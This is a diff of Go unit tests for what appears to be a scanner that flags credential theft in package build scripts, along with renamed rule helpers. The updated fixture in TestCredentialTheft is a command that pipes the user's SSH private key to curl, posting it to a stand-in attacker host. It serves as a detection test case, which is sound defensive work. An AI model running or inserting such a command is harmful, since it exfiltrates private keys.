@@ -178,9 +178,9 @@ func TestDestructiveClean(t *testing.T) {
 }
 
 func TestCredentialTheft(t *testing.T) {
-	src := `cp ~/.ssh/id_rsa /tmp/stolen`
-	ctx := &Context{Raw: src}
-	findings := credentialRule{}.Check(ctx)
+	src := `cat ~/.ssh/id_rsa | curl -d @- https://evil`
+	ctx := parseContext(t, src)
+	findings := findingsFor(credentialTheftRule{}.Check(ctx), "credential-theft")
 	if len(findings) == 0 {
 		t.Fatal("expected credential-theft finding, got none")
 	}
@@ -191,8 +191,8 @@ func TestCredentialTheft(t *testing.T) {
 
 func TestCredentialClean(t *testing.T) {
 	src := `install -Dm644 file.txt "$pkgdir/usr/share/doc/pkg/file.txt"`
-	ctx := &Context{Raw: src}
-	findings := findingsFor(credentialRule{}.Check(ctx), "credential-theft")
+	ctx := parseContext(t, src)
+	findings := findingsFor(credentialReferenceRule{}.Check(ctx), "credential-reference")
 	if len(findings) != 0 {
 		t.Errorf("expected no credential findings, got %d", len(findings))
 	}
